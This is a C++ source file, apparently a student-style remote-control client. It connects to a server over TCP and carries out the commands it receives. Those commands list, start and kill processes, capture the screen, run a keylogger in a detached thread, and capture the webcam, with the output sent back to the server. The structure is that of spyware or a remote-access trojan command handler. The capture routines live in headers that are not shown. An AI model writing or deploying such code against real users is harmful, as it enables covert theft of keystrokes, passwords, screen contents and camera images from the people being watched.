#include <boost/asio.hpp>
#include <iostream>
#include <thread>

#include "get_local_ip.hpp"
#include "list_start_stop.hpp"
#include "screen_cap.hpp"
#include "key_logger.hpp"
#include "webcam_cap.hpp"

using namespace std;
using namespace boost::asio;
using ip::tcp;

void receive_messages(tcp::socket &socket) {
    boost::system::error_code ec;
    char reply[1024];
    while (true) {
        size_t len = socket.read_some(buffer(reply), ec);
        if (ec) {
            cout << "Server disconnected." << endl;
            socket.shutdown(tcp::socket::shutdown_send); // 👈 phản hồi lại FIN
            break;
        }

        string msg(reply, len);
        cout << "\n[Server]: " << msg << endl;
        
        string response;
        if (msg == "list") {
            response = list_processes();
        } else if (msg.rfind("start ", 0) == 0) {
            string app = msg.substr(6);
            response = start_process(app);
        } else if (msg.rfind("stop ", 0) == 0) {
            string target = msg.substr(5);
            response = stop_process(target);
        } else if (msg == "screen") {
            response = screen_cap();
        } else if (msg == "keylog start") {
            if (!isKeylogging.load()) {
                std::thread t(keyLogger);
                t.detach();
                response = "Keylogger started.";
            } else {
                response = "Keylogger already running.";
            }
        } else if (msg == "keylog stop") {
            if (isKeylogging.load()) {
                isKeylogging.store(false);
                PostThreadMessage(GetCurrentThreadId(), WM_QUIT, 0, 0);
                response = "Keylogger stopped.";
            } else {
                response = "Keylogger is not running.";
            }
        } else if (msg == "webcam") {
            webcam_cap();
            response = "Webcam session ended.";
        } else {
            response = "Unknown command.";
        }

        write(socket, buffer(response));
        cout << "> " << flush;
    }
}

int main() {
    io_context io;
    tcp::resolver resolver(io);
    string local_ip = get_local_ip(io);
    auto endpoints = resolver.resolve(tcp::v4(), local_ip, "8080");

    tcp::socket socket(io);
    connect(socket, endpoints);
    cout << "Connected to server!\n";

    thread receiver(receive_messages, ref(socket));

    string message;
    while (getline(cin, message)) {
        if (message == "out") {
            socket.shutdown(tcp::socket::shutdown_send);
            break;
        }
        write(socket, buffer(message));
    }

    socket.close();
    receiver.join();
}
